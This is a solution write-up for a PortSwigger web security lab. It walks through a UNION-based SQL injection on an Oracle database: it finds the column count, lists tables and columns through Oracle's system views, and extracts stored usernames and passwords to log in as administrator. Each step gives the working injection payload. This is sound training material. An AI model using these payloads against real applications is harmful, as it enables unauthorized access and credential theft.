# SQL injection attack, listing the database contents on Oracle

**Lab Url**: [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Solution

The category filter is vulnerable to SQL injection. We can use `UNION` attacks to enumerate the Oracle database schema and extract credentials.

### Step 1: Determine the number of columns

```bash
/filter?category=Accessories' ORDER BY 2--
```

The query returns **two columns**.

### Step 2: List all tables

Oracle uses `all_tables` instead of `information_schema.tables`:

```bash
/filter?category=Accessories' UNION SELECT NULL, table_name FROM all_tables--
```

The response reveals a table likely to contain user data: `USERS_XYZ`.

### Step 3: List columns in the user table

Oracle stores column information in `all_tab_columns`:

```bash
/filter?category=Accessories' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_XYZ'--
```

![All Columns](img/all-columns.png)

The columns include `USERNAME_XYZ` and `PASSWORD_XYZ`.

### Step 4: Extract credentials

```bash
/filter?category=Accessories' UNION SELECT USERNAME_XYZ, PASSWORD_XYZ FROM USERS_XYZ--
```

![Username Password](img/username-password.png)

Log in as `administrator` with the extracted password to solve the lab.
